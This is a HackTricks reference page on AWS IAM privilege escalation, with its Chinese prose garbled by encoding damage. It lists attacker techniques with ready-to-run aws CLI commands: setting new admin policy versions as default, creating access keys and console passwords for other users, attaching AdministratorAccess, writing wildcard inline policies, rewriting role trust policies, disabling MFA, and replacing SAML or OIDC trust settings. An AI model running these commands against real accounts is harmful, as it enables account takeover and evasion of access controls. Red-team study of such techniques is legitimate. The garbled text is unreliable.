# AWS - IAM Privesc

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## IAM

æœ‰å…³IAMçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

æ‹¥æœ‰ **`iam:CreatePolicyVersion`** æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ›å»ºä»–ä»¬æœ‰æƒè®¿é—®çš„IAMç­–ç•¥çš„**æ–°ç‰ˆæœ¬**ã€‚è¿™å…è®¸ä»–ä»¬å®šä¹‰ä»–ä»¬**è‡ªå·±çš„è‡ªå®šä¹‰æƒé™**ã€‚åˆ›å»ºæ–°çš„ç­–ç•¥ç‰ˆæœ¬æ—¶ï¼Œéœ€è¦å°†å…¶**è®¾ç½®ä¸ºé»˜è®¤ç‰ˆæœ¬æ‰èƒ½ç”Ÿæ•ˆ**ï¼Œä½ å¯èƒ½ä¼šè®¤ä¸ºè¿™éœ€è¦`iam:SetDefaultPolicyVersion`æƒé™ï¼Œä½†åœ¨åˆ›å»ºæ–°çš„ç­–ç•¥ç‰ˆæœ¬æ—¶ï¼Œå¯ä»¥åŒ…å«ä¸€ä¸ªæ ‡å¿—ï¼ˆ**`--set-as-default`**ï¼‰ï¼Œè¿™å°†è‡ªåŠ¨å°†å…¶åˆ›å»ºä¸º**æ–°çš„é»˜è®¤ç‰ˆæœ¬**ã€‚ä½¿ç”¨è¯¥æ ‡å¿—**ä¸**éœ€è¦`iam:SetDefaultPolicyVersion`æƒé™ã€‚

åˆ©ç”¨è¿™ç§æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
åœ¨ `policy.json` æ–‡ä»¶ä¸­å°†åŒ…å«ä¸€ä¸ª**ç­–ç•¥æ–‡æ¡£ï¼Œå…è®¸å¯¹è´¦æˆ·ä¸­çš„ä»»ä½•èµ„æºæ‰§è¡Œä»»ä½•æ“ä½œ**ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³æ‰€æœ‰å†…å®¹ã€‚

### `iam:SetDefaultPolicyVersion`

æ‹¥æœ‰ **`iam:SetDefaultPolicyVersion`** æƒé™çš„æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿé€šè¿‡**å½“å‰æœªä½¿ç”¨çš„ç°æœ‰ç­–ç•¥ç‰ˆæœ¬**æå‡æƒé™ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥è®¿é—®çš„**ç­–ç•¥**æœ‰**éé»˜è®¤**çš„ç‰ˆæœ¬ï¼Œä»–ä»¬å¯ä»¥å°†é»˜è®¤ç‰ˆæœ¬æ›´æ”¹ä¸ºä»»ä½•å…¶ä»–ç°æœ‰ç‰ˆæœ¬ã€‚

{% hint style="warning" %}
å¦‚æœæ‚¨æ­£åœ¨**ä¿®æ”¹**ç‰ˆæœ¬çš„**ç­–ç•¥**ä¸æˆäºˆæ”»å‡»è€… `SetDefaultPolicyVersion` æƒé™çš„ç­–ç•¥ç›¸åŒï¼Œä¸”**æ–°ç‰ˆæœ¬ä¸æˆäºˆ**è¯¥æƒé™ï¼Œæ”»å‡»è€…**å°†æ— æ³•å°†ç­–ç•¥æ¢å¤åˆ°åŸå§‹çŠ¶æ€**ã€‚
{% endhint %}

åˆ©ç”¨è¿™ç§æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
å…¶ä¸­â€œv2â€æ˜¯å…·æœ‰æœ€å¤šæƒé™çš„ç­–ç•¥ç‰ˆæœ¬ã€‚

**æ½œåœ¨å½±å“ï¼š**é€šè¿‡è®¾ç½®ä¸åŒçš„ç­–ç•¥ç‰ˆæœ¬é—´æ¥æå‡æƒé™ï¼Œè¿™å¯èƒ½æˆäºˆæ›´å¤šæƒé™ã€‚

### `iam:CreateAccessKey`

æ‹¥æœ‰å¯¹å…¶ä»–ç”¨æˆ·çš„ **`iam:CreateAccessKey`** æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºå±äºå¦ä¸€ç”¨æˆ·çš„è®¿é—®å¯†é’¥ ID å’Œå¯†é’¥è®¿é—®å¯†é’¥**ï¼Œå¦‚æœä»–ä»¬è¿˜æ²¡æœ‰ä¸¤ç»„å…³è”çš„å¯†é’¥ï¼ˆæœ€ä½³å®è·µå»ºè®®ä¸åº”è¯¥æœ‰ï¼‰ã€‚

åˆ©ç”¨è¿™ç§æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam create-access-key --user-name <target_user>
```
ç›®æ ‡ç”¨æˆ·ä¸å½“å‰ç”¨æˆ·ç›¸æ¯”æ‹¥æœ‰æ›´å¹¿æ³›çš„æƒé™é›†ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ä»»ä½•ç”¨æˆ·çš„æƒé™ã€‚

### `iam:CreateLoginProfile`

æ”»å‡»è€…å¦‚æœå¯¹å…¶ä»–ç”¨æˆ·æ‹¥æœ‰ `iam:CreateLoginProfile` æƒé™ï¼Œå¯ä»¥ä¸º**ä»»ä½•å°šæœªè®¾ç½®ç™»å½•é…ç½®æ–‡ä»¶çš„ç”¨æˆ·**åˆ›å»ºå¯†ç ï¼Œä»¥ä¾¿**ç™»å½•** AWS æ§åˆ¶å°ã€‚

åˆ©ç”¨è¿™ç§æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
è¯¥å¯†ç ä¿è¯å°†æ»¡è¶³**è´¦æˆ·æœ€ä½å¯†ç è¦æ±‚**ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³â€œä»»ä½•â€ç”¨æˆ·ã€‚

### `iam:UpdateLoginProfile`

æ‹¥æœ‰å¯¹å…¶ä»–ç”¨æˆ·çš„ **`iam:UpdateLoginProfile`** æƒé™çš„æ”»å‡»è€…å¯ä»¥**æ›´æ”¹ç”¨äºç™»å½• AWS æ§åˆ¶å°çš„å¯†ç **ï¼Œå‰ææ˜¯è¯¥ç”¨æˆ·**å·²ç»è®¾ç½®äº†ç™»å½•é…ç½®æ–‡ä»¶**ã€‚

åƒåˆ›å»ºç™»å½•é…ç½®æ–‡ä»¶ä¸€æ ·ï¼Œåˆ©ç”¨è¿™ç§æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
è¯¥å¯†ç ä¿è¯å°†æ»¡è¶³**è´¦æˆ·æœ€ä½å¯†ç è¦æ±‚**ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡â€œä»»ä½•â€ç”¨æˆ·çš„æƒé™ã€‚

### `iam:UpdateAccessKey`

æ‹¥æœ‰ **`iam:UpdateAccessKey`** æƒé™çš„æ”»å‡»è€…å¯ä»¥**å¯ç”¨è¢«ç¦ç”¨çš„è®¿é—®å¯†é’¥**å¹¶ä½¿ç”¨å®ƒï¼ˆä»–éœ€è¦æ‹¥æœ‰è¢«ç¦ç”¨çš„è®¿é—®å¯†é’¥ï¼‰

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™ä»¥è®¿é—®æ‹¥æœ‰å¯†é’¥çš„ç”¨æˆ·ï¼ˆéœ€è¦æ‹¥æœ‰è¯¥å¯†é’¥ï¼‰ã€‚

### `iam:CreateServiceSpecificCredential`

å®ƒå…è®¸**ç”Ÿæˆ**ä¸€ä¸ª**ç”¨æˆ·å**å’Œ**å¯†ç **ï¼Œè¿™äº›å¯ä»¥ç”¨æ¥**è®¿é—®è¯·æ±‚ä¸­æŒ‡å®šçš„æœåŠ¡**ï¼ˆ**CodeCommit æˆ– Amazon Keyspaces** -- Apache Cassandra--ï¼‰ã€‚

æ–°çš„ç‰¹å®šæœåŠ¡å‡­è¯æ‹¥æœ‰ä¸å…³è”ç”¨æˆ·**ç›¸åŒçš„æƒé™**ï¼Œé™¤äº†å®ƒä»¬åªèƒ½ç”¨æ¥è®¿é—®æŒ‡å®šçš„æœåŠ¡ã€‚

æ¯ä¸ªæ”¯æŒçš„æœåŠ¡æ¯ä¸ªç”¨æˆ·æœ€å¤šåªèƒ½æ‹¥æœ‰**ä¸¤ç»„ç‰¹å®šæœåŠ¡çš„å‡­è¯**ã€‚

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ç”¨æˆ·æœåŠ¡æƒé™ã€‚

### `iam:ResetServiceSpecificCredential`

ç±»ä¼¼äº **`iam:CreateServiceSpecificCredential`**ï¼Œä½†ä¸æ˜¯åˆ›å»ºæ–°çš„å‡­è¯ï¼Œè€Œæ˜¯é‡ç½®ä¸€ä¸ªã€‚&#x20;

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
```markdown
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ç”¨æˆ·æœåŠ¡æƒé™ã€‚

### `iam:AttachUserPolicy`

æ‹¥æœ‰ **`iam:AttachUserPolicy`** æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡**å°†ç­–ç•¥é™„åŠ åˆ°ä»–ä»¬å¯ä»¥è®¿é—®çš„ç”¨æˆ·**æ¥æå‡æƒé™ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ åˆ°æ”»å‡»è€…èº«ä¸Šã€‚

åˆ©ç”¨è¿™ç§æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ä»»ä½•æƒé™ã€‚

### `iam:AttachGroupPolicy`

æ‹¥æœ‰ **`iam:AttachGroupPolicy`** æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡**å°†ç­–ç•¥é™„åŠ åˆ°ä»–ä»¬æ‰€åœ¨çš„ç»„**æ¥æå‡æƒé™ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ ç»™æ”»å‡»è€…ã€‚
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Where the group is a group the current user is a part of.

**æ½œåœ¨å½±å“ï¼š** å¦‚æœç”¨æˆ·åœ¨æŸä¸ªç»„å†…ï¼Œå¯èƒ½ç›´æ¥æå‡è‡³ä»»ä½•æƒé™ã€‚

### `iam:AttachRolePolicy`, ( `sts:AssumeRole`|`iam:createrole`)

æ‹¥æœ‰ **`iam:AttachRolePolicy`** æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡**å°†ç­–ç•¥é™„åŠ åˆ°è§’è‰²**æ¥æå‡æƒé™ï¼Œè¯¥è§’è‰²æ˜¯æ”»å‡»è€…å¯ä»¥è®¿é—®çš„ï¼Œä»è€Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ ç»™æ”»å‡»è€…ã€‚
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
```markdown
å…¶ä¸­è§’è‰²æ˜¯å½“å‰ç”¨æˆ·å¯ä»¥ä½¿ç”¨ `sts:AssumeRole` ä¸´æ—¶æ‰®æ¼”çš„è§’è‰²ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ä»»ä½•æƒé™ã€‚

### `iam:PutUserPolicy`

æ‹¥æœ‰ `iam:PutUserPolicy` æƒé™çš„æ”»å‡»è€…å¯ä»¥**é€šè¿‡ä¸ºä»–ä»¬å¯ä»¥è®¿é—®çš„ç”¨æˆ·åˆ›å»ºæˆ–æ›´æ–°å†…è”ç­–ç•¥æ¥æå‡æƒé™**ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ ç»™æ”»å‡»è€…ã€‚
```
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
æ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„ç­–ç•¥ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ä»»ä½•æƒé™ã€‚

### `iam:PutGroupPolicy`

æ‹¥æœ‰ `iam:PutGroupPolicy` æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡**ä¸ºä»–ä»¬æ‰€åœ¨çš„ç»„åˆ›å»ºæˆ–æ›´æ–°å†…è”ç­–ç•¥**ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ ç»™æ”»å‡»è€…ï¼Œä»è€Œæå‡æƒé™ã€‚
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
### `iam:PutRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

æ‹¥æœ‰ **`iam:PutRolePolicy`** æƒé™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡**ä¸ºä»–ä»¬å¯ä»¥è®¿é—®çš„è§’è‰²åˆ›å»ºæˆ–æ›´æ–°å†…è”ç­–ç•¥**ï¼Œå°†è¯¥ç­–ç•¥çš„æƒé™æ·»åŠ ç»™æ”»å‡»è€…ï¼Œä»è€Œæå‡æƒé™ã€‚

åˆ©ç”¨è¿™ç§æ–¹æ³•çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
```markdown
å…¶ä¸­è§’è‰²æ˜¯å½“å‰ç”¨æˆ·å¯ä»¥ä½¿ç”¨ `sts:AssumeRole` æš‚æ—¶æ‰®æ¼”çš„è§’è‰²ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³ä»»ä½•äº‹ç‰©ã€‚

### `iam:AddUserToGroup`

æ‹¥æœ‰ **`iam:AddUserToGroup`** æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒå°†è‡ªå·±**æ·»åŠ åˆ° AWS è´¦æˆ·ä¸­çš„ç°æœ‰ IAM ç»„**ã€‚
```
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
**ç›®æ ‡ç»„æ‹¥æœ‰æ¯”æ”»å‡»è€…ç”¨æˆ·è´¦æˆ·æ›´å¤š/ä¸åŒçš„æƒé™ã€‚**

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°ä»»ä½•ç»„çš„æƒé™ã€‚

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

æ‹¥æœ‰ `iam:UpdateAssumeRolePolicy` å’Œ `sts:AssumeRole` æƒé™çš„æ”»å‡»è€…å°†èƒ½å¤Ÿ**æ›´æ”¹ä»»ä½•ç°æœ‰è§’è‰²çš„æ‰®æ¼”è§’è‰²ç­–ç•¥æ–‡æ¡£**ï¼Œä»¥å…è®¸ä»–ä»¬æ‰®æ¼”è¯¥è§’è‰²ã€‚
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
```markdown
å½“ç­–ç•¥å¦‚ä¸‹æ‰€ç¤ºï¼Œå®ƒæˆäºˆç”¨æˆ·æƒé™ä»¥æ‰®æ¼”è§’è‰²ï¼š
```
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³ä»»ä½•è§’è‰²ã€‚

### `iam:UploadSSHPublicKey`

æ‹¥æœ‰ `iam:DeactivateMFADevice` æƒé™çš„æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ª**SSHå…¬é’¥å¹¶å°†å…¶ä¸æŒ‡å®šçš„IAMç”¨æˆ·å…³è”**([äº†è§£æ›´å¤š](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html))ã€‚

é€šè¿‡æ­¤æ“ä½œä¸Šä¼ çš„SSHå…¬é’¥åªèƒ½ç”¨äº**éªŒè¯å…³è”çš„IAMç”¨æˆ·ä»¥è®¿é—®CodeCommitä»“åº“**ã€‚æœ‰å…³ä½¿ç”¨SSHå¯†é’¥è¿›è¡Œè®¤è¯ä»¥è®¿é—®CodeCommitä»“åº“çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…_CodeCommitç”¨æˆ·æŒ‡å—_ä¸­çš„[ä¸ºSSHè¿æ¥è®¾ç½®CodeCommit](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html)ã€‚
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**æ½œåœ¨å½±å“ï¼š** é—´æ¥æå‡è‡³CodeCommitæƒé™ã€‚

### `iam:DeactivateMFADevice`

æ‹¥æœ‰`iam:DeactivateMFADevice`æƒé™çš„æ”»å‡»è€…å¯ä»¥**åœç”¨æŒ‡å®šçš„MFAè®¾å¤‡**å¹¶è§£é™¤å…¶ä¸æœ€åˆå¯ç”¨è¯¥è®¾å¤‡çš„IAMç”¨æˆ·çš„å…³è”ï¼ˆ[äº†è§£æ›´å¤š](https://docs.aws.amazon.com/IAM/latest/APIReference/API_DeactivateMFADevice.html)ï¼‰ã€‚
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**æ½œåœ¨å½±å“ï¼š** å¦‚æœæ‚¨å·²çŸ¥å…¶ç”¨æˆ·åå’Œå¯†ç ï¼Œé€šè¿‡ç¦ç”¨MFAè®¾å¤‡é—´æ¥æå‡ç”¨æˆ·æƒé™ã€‚

### `iam:ResyncMFADevice`

æ‹¥æœ‰`iam:ResyncMFADevice`æƒé™çš„æ”»å‡»è€…å¯ä»¥**åŒæ­¥æŒ‡å®šçš„MFA**è®¾å¤‡ä¸IAMå®ä½“ï¼šç”¨æˆ·æˆ–è§’è‰²ï¼ˆ[äº†è§£æ›´å¤š](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html)ï¼‰ã€‚
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**æ½œåœ¨å½±å“ï¼š** å¦‚æœæ‚¨å·²ç»çŸ¥é“ä»–çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ MFAè®¾å¤‡é—´æ¥æå‡ç”¨æˆ·æƒé™ã€‚

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

æ‹¥æœ‰è¿™äº›æƒé™ï¼Œæ‚¨å¯ä»¥**æ›´æ”¹SAMLè¿æ¥çš„XMLå…ƒæ•°æ®**ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥æ»¥ç”¨**SAMLè”åˆè®¤è¯**ï¼Œä»¥ä»»ä½•**ä¿¡ä»»å®ƒçš„è§’è‰²**èº«ä»½**ç™»å½•**ã€‚

è¯·æ³¨æ„ï¼Œè¿™æ ·åš**åˆæ³•ç”¨æˆ·å°†æ— æ³•ç™»å½•**ã€‚ç„¶è€Œï¼Œæ‚¨å¯ä»¥è·å–XMLï¼Œè¿™æ ·æ‚¨å°±å¯ä»¥æ”¾ç½®æ‚¨çš„XMLï¼Œç™»å½•å¹¶é…ç½®å›ä¹‹å‰çš„è®¾ç½®ã€‚
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
å¾…åŠäº‹é¡¹ï¼šä¸€ä¸ªèƒ½å¤Ÿç”ŸæˆSAMLå…ƒæ•°æ®å¹¶ä½¿ç”¨æŒ‡å®šè§’è‰²ç™»å½•çš„å·¥å…·
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

ï¼ˆä¸ç¡®å®šï¼‰å¦‚æœæ”»å‡»è€…æ‹¥æœ‰è¿™äº›**æƒé™**ï¼Œä»–å¯ä»¥æ·»åŠ ä¸€ä¸ªæ–°çš„**Thumbprint**ï¼Œä»¥ä¾¿ç™»å½•æ‰€æœ‰ä¿¡ä»»è¯¥æä¾›è€…çš„è§’è‰²ã€‚

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
